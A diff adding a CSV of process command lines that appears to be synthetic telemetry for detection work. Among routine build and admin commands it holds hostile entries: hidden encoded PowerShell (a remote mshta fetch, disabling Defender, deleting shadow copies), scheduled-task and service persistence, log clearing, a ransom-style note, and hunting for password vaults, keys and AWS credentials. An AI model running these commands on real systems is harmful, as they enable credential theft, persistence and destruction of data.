@@ -1,0 +1,221 @@
+process_name,command_line
+powershell.exe,Get-Service | Where-Object Status -eq Running
+git.exe,git commit -am 'chore: bump jq'
+systeminfo.exe,systeminfo
+curl.exe,curl.exe -s http://localhost:5000/health
+powershell.exe,Get-Process | Sort-Object CPU -Descending | Select -First 10
+dotnet.exe,dotnet build infra.sln -c Release
+ipconfig.exe,ipconfig /all
+powershell.exe,powershell -nop -w hidden -enc bQBzAGgAdABhACAAaAB0AHQAcAA6AC8ALwAxADkAOAAuADUAMQAuADEAMAAwAC4AMQA1ADkALwBpAC4AaAB0AGEA
+git.exe,git status
+powershell.exe,Get-EventLog -LogName Application -Newest 20
+pip.exe,pip install -r requirements.txt
+powershell.exe,Get-ChildItem C:\Users\backupadmin\Documents
+sqlcmd.exe,"sqlcmd -S db -d nginx -Q ""SELECT COUNT(*) FROM dbo.Orders"""
+tasklist.exe,tasklist /fo table
+sc.exe,sc query api-gateway
+kubectl.exe,kubectl get pods -n production
+nuget.exe,nuget restore data-pipeline.sln
+git.exe,git pull origin hotfix/login
+git.exe,git commit -am 'chore: bump openjdk-17-jdk'
+robocopy.exe,robocopy C:\build\dist \\web\redis /MIR /NFL
+docker.exe,docker build -t worker:16 .
+powershell.exe,powershell -nop -w hidden -enc cABvAHcAZQByAHMAaABlAGwAbAAgAC0AbgBvAHAAIAAtAHcAIABoAGkAZABkAGUAbgAgAC0AZQBuAGMAIABTAFEAQgBGAEEARgBnAEEASQBBAEEAbwBBAEcANABBAFoAUQBCADMAQQBDADAAQQBiAHcAbgA=
+powershell.exe,Test-Connection -Count 2 db-45
+where.exe,where python
+python.exe,python -m pytest tests\ -q
+dotnet.exe,dotnet test
+git.exe,git commit -am 'chore: bump python3-pip'
+schtasks.exe,schtasks /create /sc minute /mo 10 /tn UpdateSync /tr C:\Windows\Temp\telemetry.exe /f
+nuget.exe,nuget restore billing-service.sln
+dotnet.exe,dotnet build billing-service.sln -c Release
+robocopy.exe,robocopy C:\build\dist \\web\payments /MIR /NFL
+docker.exe,docker build -t postgres:57 .
+robocopy.exe,robocopy C:\build\dist \\web\search /MIR /NFL
+powershell.exe,Restart-Service -Name auth-svc
+nuget.exe,nuget restore mobile-api.sln
+powershell.exe,Test-Connection -Count 2 db-79
+sqlcmd.exe,"sqlcmd -S db -d api-gateway -Q ""SELECT COUNT(*) FROM dbo.Orders"""
+explorer.exe,explorer C:\Users\backupadmin\Downloads
+msbuild.exe,msbuild /t:Rebuild /p:Configuration=Release
+reg.exe,reg add HKLM\System\CurrentControlSet\Services\Upd /v ImagePath /d C:\Windows\Temp\telemetry.exe /f
+git.exe,git pull origin develop
+sc.exe,sc query postgres
+net.exe,net use Z: \\fileserver\share
+powershell.exe,Restart-Service -Name redis
+docker.exe,docker ps -a
+powershell.exe,powershell -nop -w hidden -enc cABvAHcAZQByAHMAaABlAGwAbAAgAC0AbgBvAHAAIAAtAGMAIABTAGUAdAAtAE0AcABQAHIAZQBmAGUAcgBlAG4AYwBlACAALQBEAGkAcwBhAGIAbABlAFIAZQBhAGwAdABpAG0AZQBNAG8AbgBpAHQAbwByAGkAbgBnACAAJAB0AHIAdQBlAA==
+powershell.exe,Test-Connection -Count 2 db-18
+powershell.exe,Test-Connection -Count 2 db-72
+docker.exe,docker build -t worker:38 .
+powershell.exe,Restart-Service -Name search
+robocopy.exe,robocopy C:\build\dist \\web\worker /MIR /NFL
+powershell.exe,Test-Connection -Count 2 db-30
+powershell.exe,Restart-Service -Name api-gateway
+sqlcmd.exe,"sqlcmd -S db -d search -Q ""SELECT COUNT(*) FROM dbo.Orders"""
+git.exe,git pull origin release/2.4
+choco.exe,choco install openjdk-17-jdk -y
+sc.exe,sc query nginx
+nuget.exe,nuget restore web-app.sln
+powershell.exe,Test-Connection -Count 2 db-11
+robocopy.exe,robocopy C:\build\dist \\web\nginx /MIR /NFL
+git.exe,git commit -am 'chore: bump htop'
+powershell.exe,Test-Connection -Count 2 db-15
+dotnet.exe,dotnet build platform.sln -c Release
+net.exe,net view /all
+powershell.exe,Test-Connection -Count 2 db-56
+nuget.exe,nuget restore infra.sln
+powershell.exe,Test-Connection -Count 2 db-73
+docker.exe,docker build -t postgres:10 .
+choco.exe,choco install git-lfs -y
+powershell.exe,Test-Connection -Count 2 db-38
+powershell.exe,Test-Connection -Count 2 db-74
+git.exe,git commit -am 'chore: bump git-lfs'
+sqlcmd.exe,"sqlcmd -S db -d postgres -Q ""SELECT COUNT(*) FROM dbo.Orders"""
+docker.exe,docker build -t search:29 .
+powershell.exe,powershell -nop -w hidden -enc dgBzAHMAYQBkAG0AaQBuACAAZABlAGwAZQB0AGUAIABzAGgAYQBkAG8AdwBzACAALwBhAGwAbAAgAC8AcQB1AGkAZQB0AA==
+powershell.exe,Restart-Service -Name nginx
+dotnet.exe,dotnet build data-pipeline.sln -c Release
+dotnet.exe,dotnet build web-app.sln -c Release
+git.exe,git commit -am 'chore: bump nodejs'
+sqlcmd.exe,"sqlcmd -S db -d redis -Q ""SELECT COUNT(*) FROM dbo.Orders"""
+docker.exe,docker build -t auth-svc:32 .
+powershell.exe,powershell -nop -w hidden -enc YwBlAHIAdAB1AHQAaQBsACAALQBlAG4AYwBvAGQAZQAgAEMAOgBcAFcAaQBuAGQAbwB3AHMAXABUAGUAbQBwAFwAZABvAGMAcwAgAEMAOgBcAFcAaQBuAGQAbwB3AHMAXABUAGUAbQBwAFwAdABlAGwAZQBtAGUAdAByAHkALgB6AGkAcAA=
+choco.exe,choco install ripgrep -y
+sqlcmd.exe,"sqlcmd -S db -d payments -Q ""SELECT COUNT(*) FROM dbo.Orders"""
+sqlcmd.exe,"sqlcmd -S db -d worker -Q ""SELECT COUNT(*) FROM dbo.Orders"""
+powershell.exe,Restart-Service -Name worker
+powershell.exe,Test-Connection -Count 2 db-12
+docker.exe,docker build -t nginx:93 .
+sc.exe,sc query payments
+powershell.exe,Test-Connection -Count 2 db-77
+git.exe,git pull origin feature/checkout
+docker.exe,docker build -t postgres:63 .
+robocopy.exe,robocopy C:\build\dist \\web\auth-svc /MIR /NFL
+git.exe,git pull origin main
+cmd.exe,cmd /c copy C:\Windows\Temp\NOTE.txt %PUBLIC%\READ_ME.txt
+docker.exe,docker build -t search:57 .
+dotnet.exe,dotnet build mobile-api.sln -c Release
+docker.exe,docker build -t postgres:52 .
+powershell.exe,Test-Connection -Count 2 db-26
+powershell.exe,Test-Connection -Count 2 db-7
+git.exe,git commit -am 'chore: bump ripgrep'
+powershell.exe,Test-Connection -Count 2 db-90
+sqlcmd.exe,"sqlcmd -S db -d auth-svc -Q ""SELECT COUNT(*) FROM dbo.Orders"""
+docker.exe,docker build -t postgres:64 .
+nuget.exe,nuget restore platform.sln
+powershell.exe,Test-Connection -Count 2 db-64
+net.exe,net localgroup administrators
+robocopy.exe,robocopy C:\build\dist \\web\api-gateway /MIR /NFL
+sc.exe,sc query worker
+choco.exe,choco install htop -y
+choco.exe,choco install python3-pip -y
+powershell.exe,Test-Connection -Count 2 db-5
+choco.exe,choco install nodejs -y
+powershell.exe,Test-Connection -Count 2 db-50
+docker.exe,docker build -t nginx:89 .
+powershell.exe,Test-Connection -Count 2 db-9
+sc.exe,sc query auth-svc
+powershell.exe,Test-Connection -Count 2 db-86
+choco.exe,choco install jq -y
+tasklist.exe,tasklist /v /fo csv
+powershell.exe,Test-Connection -Count 2 db-24
+docker.exe,docker build -t redis:60 .
+docker.exe,docker build -t search:16 .
+docker.exe,docker build -t api-gateway:58 .
+wevtutil.exe,wevtutil cl Security
+robocopy.exe,robocopy C:\build\dist \\web\postgres /MIR /NFL
+powershell.exe,Test-Connection -Count 2 db-19
+sc.exe,sc query redis
+docker.exe,docker build -t nginx:44 .
+powershell.exe,Test-Connection -Count 2 db-75
+powershell.exe,Test-Connection -Count 2 db-89
+docker.exe,docker build -t auth-svc:59 .
+powershell.exe,"powershell -nop -c ""Get-ChildItem -Recurse -Include *.kdbx,*.pem $env:USERPROFILE"""
+docker.exe,docker build -t search:28 .
+docker.exe,docker build -t postgres:5 .
+docker.exe,docker build -t worker:5 .
+docker.exe,docker build -t payments:27 .
+docker.exe,docker build -t auth-svc:80 .
+powershell.exe,Test-Connection -Count 2 db-68
+docker.exe,docker build -t search:46 .
+powershell.exe,Test-Connection -Count 2 db-78
+powershell.exe,Test-Connection -Count 2 db-70
+docker.exe,docker build -t payments:16 .
+powershell.exe,Test-Connection -Count 2 db-94
+powershell.exe,Test-Connection -Count 2 db-93
+docker.exe,docker build -t auth-svc:42 .
+type,type %USERPROFILE%\.aws\credentials
+docker.exe,docker build -t redis:92 .
+powershell.exe,Test-Connection -Count 2 db-85
+docker.exe,docker build -t auth-svc:44 .
+docker.exe,docker build -t api-gateway:85 .
+docker.exe,docker build -t api-gateway:35 .
+powershell.exe,Restart-Service -Name postgres
+docker.exe,docker build -t worker:75 .
+docker.exe,docker build -t payments:15 .
+powershell.exe,Test-Connection -Count 2 db-53
+powershell.exe,Restart-Service -Name payments
+docker.exe,docker build -t auth-svc:52 .
+sc.exe,sc query search
+powershell.exe,Test-Connection -Count 2 db-13
+docker.exe,docker build -t nginx:36 .
+docker.exe,docker build -t worker:71 .
+net.exe,net localgroup administrators # 9029
+docker.exe,docker build -t auth-svc:84 .
+docker.exe,docker build -t api-gateway:53 .
+docker.exe,docker build -t search:35 .
+docker.exe,docker build -t api-gateway:72 .
+docker.exe,docker build -t nginx:76 .
+powershell.exe,Test-Connection -Count 2 db-21
+powershell.exe,Test-Connection -Count 2 db-23
+docker.exe,docker build -t payments:31 .
+docker.exe,docker build -t nginx:9 .
+docker.exe,docker build -t worker:83 .
+powershell.exe,Test-Connection -Count 2 db-98
+tasklist.exe,tasklist /v /fo csv # 6776
+docker.exe,docker build -t nginx:72 .
+docker.exe,docker build -t worker:84 .
+docker.exe,docker build -t postgres:28 .
+docker.exe,docker build -t auth-svc:65 .
+docker.exe,docker build -t search:71 .
+powershell.exe,Test-Connection -Count 2 db-22
+powershell.exe,"powershell -nop -c ""Clear-EventLog -LogName Security"""
+powershell.exe,Test-Connection -Count 2 db-1
+docker.exe,docker build -t worker:41 .
+powershell.exe,Test-Connection -Count 2 db-20
+docker.exe,docker build -t auth-svc:33 .
+powershell.exe,Test-Connection -Count 2 db-71
+powershell.exe,Test-Connection -Count 2 db-34
+docker.exe,docker build -t nginx:19 .
+docker.exe,docker build -t api-gateway:16 .
+docker.exe,docker build -t payments:19 .
+docker.exe,docker build -t auth-svc:20 .
+docker.exe,docker build -t search:20 .
+docker.exe,docker build -t nginx:81 .
+powershell.exe,Test-Connection -Count 2 db-35
+powershell.exe,"powershell -nop -c ""Get-ChildItem -Recurse -Include *.kdbx,*.pem $env:USERPROFILE"" # 1435"
+powershell.exe,Test-Connection -Count 2 db-59
+docker.exe,docker build -t postgres:47 .
+docker.exe,docker build -t nginx:43 .
+powershell.exe,Test-Connection -Count 2 db-91
+docker.exe,docker build -t worker:31 .
+docker.exe,docker build -t api-gateway:84 .
+type,type %USERPROFILE%\.aws\credentials # 2094
+powershell.exe,Test-Connection -Count 2 db-32
+powershell.exe,Test-Connection -Count 2 db-6
+docker.exe,docker build -t auth-svc:94 .
+powershell.exe,Test-Connection -Count 2 db-88
+powershell.exe,Test-Connection -Count 2 db-95
+docker.exe,docker build -t postgres:11 .
+powershell.exe,Test-Connection -Count 2 db-31
+docker.exe,docker build -t api-gateway:56 .
+docker.exe,docker build -t search:81 .
+powershell.exe,Test-Connection -Count 2 db-25
+docker.exe,docker build -t api-gateway:83 .
+net.exe,net localgroup administrators # 4142
+docker.exe,docker build -t payments:69 .
+docker.exe,docker build -t redis:83 .
+docker.exe,docker build -t search:66 .
+docker.exe,docker build -t redis:3 .
+docker.exe,docker build -t search:24 .
